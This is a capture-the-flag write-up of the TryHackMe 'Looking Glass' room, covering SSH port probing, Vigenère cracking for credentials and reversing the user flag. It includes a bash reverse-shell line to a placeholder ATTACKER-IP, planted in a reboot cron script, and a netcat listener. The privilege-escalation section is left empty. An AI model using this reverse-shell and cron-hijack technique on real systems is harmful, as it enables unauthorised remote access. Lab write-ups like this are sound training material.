<html>
    <head>
        <title> 4m4Sec :: Looking-Glass THM Write-UP </title>

        <!-- Head Meta -->
        <meta charset="utf-8">
        <meta content="width=device-width, initial-scale=1.0" name="viewport">
        <meta content="Amanara | 4m4Sec" property="og:title">
        <meta content="https://4m4sec.github.io/assets/img/ogimage.jpg" property="og:image">
        <meta content="4m4sec website. Cybersecurity enthusiast, ctf player and web-dev. Boot-to-Root enjoyer üíÄ"
              property="og:description">
        <meta content="Amanara" name="author">

        <!-- CSS & JS -->
        <link href="../../../assets/img/icon.png" rel="icon" type="image/png">
        <link href="../../../assets/css/index.css" rel="stylesheet">
        <link href="../../../assets/css/writeup.css" rel="stylesheet">
        <link href="../../../vendor/termynal/termynal.css" rel="stylesheet">
        <link href="../../../vendor/mdi/css/materialdesignicons.min.css" rel="stylesheet">
        <script src="../../../app/project/projects.js"></script>
        <link href="https://fonts.googleapis.com" rel="preconnect">
        <link crossorigin href="https://fonts.gstatic.com" rel="preconnect">
        <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300&display=swap" rel="stylesheet">
    </head>

    <body>
    <header class="s-header">
        <div class="header-logo">
            <a href="../../../">
                <img src="../../../assets/img/icon.png">
            </a>
        </div>

        <div class="header-content">
            <nav class="row header-nav-wrap">
                <ul class="header-nav">
                    <li><a class="smoothscroll" href="#top"> Top </a></li>
                    <li><a class="smoothscroll" href="#recon"> Recon </a></li>
                    <li><a class="smoothscroll" href="#access"> Gaining Access </a></li>
                    <li><a class="smoothscroll" href="#latmov"> LatMov </a></li>
                    <li><a class="smoothscroll" href="#privesc"> PrivEsc </a></li>
                </ul>
            </nav>
        </div>
        <a class="header-menu-toggle" href=""><span> Menu </span></a>
    </header>

    <section data-image-src="../../../assets/img/header-background.jpg" data-natural-height=1080 data-natural-width=1920 data-parallax="scroll" data-position-y=center id="top">
        <div class="writeup-presentation">
            <hr>
            <div>
                <h1> THM - Looking Glass - WriteUP </h1>
            </div>
            <hr>
            <div>
                <img class="wonderland-img" src="https://tryhackme-images.s3.amazonaws.com/room-icons/56215a135c08963843afda2240c317a3.png">
            </div>
            <hr>
            <div class="tag-list">
                <button class="tag-button"> wonderland </button>
                <button class="tag-button"> ctf </button>
                <button class="tag-button"> alice </button>
                <button class="tag-button"> ssh </button>
            </div>
        </div>
    </section>

    <main>
        <div class="wt-section">
            <h1> Introduction </h1>
            <p class="writeup-text"><a href="https://tryhackme.com/room/lookingglass">Looking-Glass</a> is one of the 'free rooms' implemented by TryHackMe. You have to find and obtain user & root flags. </p>
            <ul>
                <li>
                    <p class="writeup-text"> Name : <a href="https://tryhackme.com/room/lookingglass">Looking-Glass</a></p>
                </li>
                <li>
                    <p class="writeup-text"> Difficulty : Medium </p>
                </li>
                <li>
                    <p class="writeup-text"> OS : Linux </p>
                </li>
                <li>
                    <p class="writeup-text"> Type : Web-App Security </p>
                </li>
            </ul>
            <p class="writeup-text"> Let's dive into the challenge ! </p>
        </div>
        <div class="wt-section" id="recon">
            <h1> Reconnaissance </h1>
            <p class="writeup-text"> I firstly added the machine ip address to my /etc/hosts file : </p>
            <p class="writeup-text"> <code>$ sudo echo '{MACHINE-IP} looking.thm' >> /etc/hosts </code> </p>
            <p class="writeup-text"> I used nmap scanner to enumerate open ports on the machine : </p>
            <p class="writeup-text"><code> $ nmap -A looking.thm </code></p>
            <p class="writeup-text"> We can see that a lot of port are open : they all refer to ssh service. </p>
            <p class="writeup-text"> When we try to connect to a random port, we get something strange : </p>
            <p class="writeup-text">
                <code class="shell-response">
$ ssh looking.thm -p 12000

lower
                </code>
            </p>
            <p class="writeup-text">
                <code class="shell-response">
$ ssh looking.thm -p 13000

higher
                </code>
            </p>
            <p class="writeup-text"> Hmmm... That's kinda weird because the port should be smaller than 12000 and higher than 13000. There is something wrong here. Let's take a look to the room hint : </p>
            <div>
                <img class="writeup-img" src="../../../assets/img/thm/looking-glass/room_hint.png">
            </div>
            <p class="writeup-text"> Ok so, what does a mirror do ? It basically reflects what's in front of it, but it's reversed. </p>
            <p class="writeup-text"> Taking this information, we can deduce the fact that ssh's login response should be reversed. </p>
            <p class="writeup-text"> Thus, my ssh login response tell us that the port is higher than 12000 but lower than 13000. That makes sense. </p>
            <p class="writeup-text"> After trying to connect to all ports between 12000 anb 13000, I finally found the right one ! </p>
        </div>

        <div class="wt-section" id="access">
            <h1> Gaining Access </h1>
            <p class="writeup-text">
                <code class="shell-response">
$ ssh looking.thm -p 12538

You've found the real service.
Solve the challenge to get access to the box

Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

'Fvphve ewl Jbfugzlvgb, ff woy!
Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
Bplhrf xag Rjinlu imro, pud tlnp
Bwl jintmofh Iaohxtachxta!'

Oi tzdr hjw oqzehp jpvvd tc oaoh:
Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
Hv rfwmgl wl fp moi Tfbaun xkgm,
Puh jmvsd lloimi bp bwvyxaa.

Eno pz io yyhqho xyhbkhe wl sushf,
Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
Pud cykdttk ej ba gaxt!

Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
Ewl vpvict qseux dine huidoxt-achgb!
Al peqi pt eitf, ick azmo mtd wlae
Lx ymca krebqpsxug cevm.

'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
Cpqx vw bf eifz, qy mthmjwa dwn!
V jitinofh kaz! Gtntdvl! Ttspaj!'
Wl ciskvttk me apw jzn.

'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd

Enter the secret code :
                </code>
            </p>
            <p class="writeup-text"> Okay. Here we have an encrypted message. It looks like Vigenere cipher. But we don't know the key. </p>
            <p class="writeup-text"> Thanks god, I know a very useful website : <a href="https://www.boxentriq.com/code-breaking/vigenere-cipher">boxentriq.com</a> that help us to break the key. </p>
            <p class="writeup-text"> So we copy the encrypted text (without the 'Jabberwocky' at the start) and we paste it in the text box. Then we increase the 'Max Key Length' to 20, and we click to 'Auto solve' : </p>
            <div>
                <img class="writeup-img" src="../../../assets/img/thm/looking-glass/vigenere_crack.png">
            </div>
            <p class="writeup-text"> Then, it will take some times to break the Vigen√®re key : </p>
            <div>
                <img class="writeup-img" src="../../../assets/img/thm/looking-glass/cracked_key.png">
            </div>
            <p class="writeup-text"> Now that we have the key, let's decrypt the text with the help of <a href="https://gchq.github.io/CyberChef/">CyberChef</a> :</p>
            <p class="writeup-text"> We can see at the bottom of the decrypted text that we have the 'secret code' asked by the ssh connection. We can paste it, and it will give us ssh credentials : </p>
            <p class="writeup-text">
                <code class="shell-response">
$ ssh looking.thm -p 12538

You've found the real service.
Solve the challenge to get access to the box

[...]

Enter the secret code : [REDACTED]

jabberwock:[REDACTED]
                </code>
            </p>
            <p class="writeup-text"> Now that we have jabberwock's ssh credentials, we can connect : </p>
            <p class="writeup-text">
                <code class="shell-response">
$ ssh jabberwock@10.10.65.227

jabberwock@10.10.65.227's password:
Last login: Fri Jul  3 03:05:33 2020 from 192.168.170.1

jabberwock@looking-glass:~$
                </code>
            </p>
            <p class="writeup-text"> Alright ! We are connected as Jabberwock. Let's leverage our privileges. </p>
        </div>

        <div class="wt-section" id="latmov">
            <h1> Lateral Movements </h1>
            <p class="writeup-text"> Now that we are connected on the machine, let's search for user flag. The user.txt is located in the home folder : </p>
            <p class="writeup-text">
                <code class="shell-response">
jabberwock@looking-glass:~$ cat user.txt
}DETCADER{mht
                </code>
            </p>
            <p class="writeup-text"> Hmm... The flag seems to be reversed. Everithing is upside down here ! Let's reverse it with python : </p>
            <p class="writeup-text">
                <code class="shell-response">
jabberwock@looking-glass:~$ python3 -c 'print("}DETCADER{mht"[::-1])'
thm{REDACTED}
                </code>
            </p>
            <p class="writeup-text challenge-answer"><span> Get the user flag ? </span> Answer : thm{REDACTED} </p>
            <p class="writeup-text"> Okay so, what's next ? Let's check the crontab file first : </p>
            <p class="writeup-text">
                <code class="shell-response">
jabberwock@looking-glass:~$ cat /etc/crontab

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
                </code>
            </p>
            <p class="writeup-text"> We can see here that we have a particular cronjob. The twasBrillig.sh file is executed only when the machine reboots. It is kinda unusual to have a cronjob that runs when the machine reboots because we need root privileges to restart the machine. Let's check sudo permissions : </p>
            <p class="writeup-text">
                <code class="shell-response">
jabberwock@looking-glass:~$ sudo -l

Matching Defaults entries for jabberwock on looking-glass:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jabberwock may run the following commands on looking-glass:
    (root) NOPASSWD: /sbin/reboot
                </code>
            </p>
            <p class="writeup-text"> Alright, we have the right permission. Let's add our bash command to get a reverse shell inside the twasBrillig.sh file : </p>
            <p class="writeup-text"><code> jabberwock@looking-glass:~$ echo 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1' >> twasBrillig.sh </code></p>
            <p class="writeup-text"> Now we just have to reboot the machine, but before, let's open a connexion with netcat  : </p>
            <p class="writeup-text"><code> $ nc -lnvp 4444 </code></p>
            <p class="writeup-text">
                <code class="shell-response">
jabberwock@looking-glass:~$ sudo /sbin/reboot
VarInt Decode
Connection to 10.10.65.227 closed by remote host.
                </code>
            </p>
        </div>
        <div class="wt-section" id="privesc">
            <h1> Privilege Escalation </h1>
            
        </div>
    </main>

    <footer>
        <div class="footer">
            <div class="row" id="social">
                <a href="https://github.com/4m4sec/" target="_blank"><i class="mdi mdi-github-circle"></i></a>
                <a href="https://discord.gg/hardware" target="_blank"><i class="mdi mdi-discord"></i></a>
                <a href="http://4m4sec.me/" target="_blank"><i class="mdi mdi-web"></i></a>
                <a href="https://twitter.com/4m4sec" target="_blank"><i class="mdi mdi-twitter"></i></a>
            </div>

            <div class="row" id="expl">
                <ul>
                    <li><a class="smoothscroll" href="#top"> Top </a></li>
                    <li><a class="smoothscroll" href="#recon"> Recon </a></li>
                    <li><a class="smoothscroll" href="#access"> Gaining Access </a></li>
                    <li><a class="smoothscroll" href="#access"> LatMov </a></li>
                    <li><a class="smoothscroll" href="#privesc"> PrivEsc </a></li>
                </ul>
            </div>

            <div class="row">
                <span class="copy"> Copyright 4m4sec ¬© 2023 </span>
            </div>
        </div>
    </footer>

    <script data-termynal-container="#termynal" src="../../../vendor/termynal/termynal.js"></script>
    <script src="../../../vendor/jquery/jquery-3.2.1.min.js"></script>
    <script src="../../../app/App.js"></script>
    <script src="../../../vendor/parallax/parallax.js"></script>
    </body>
</html>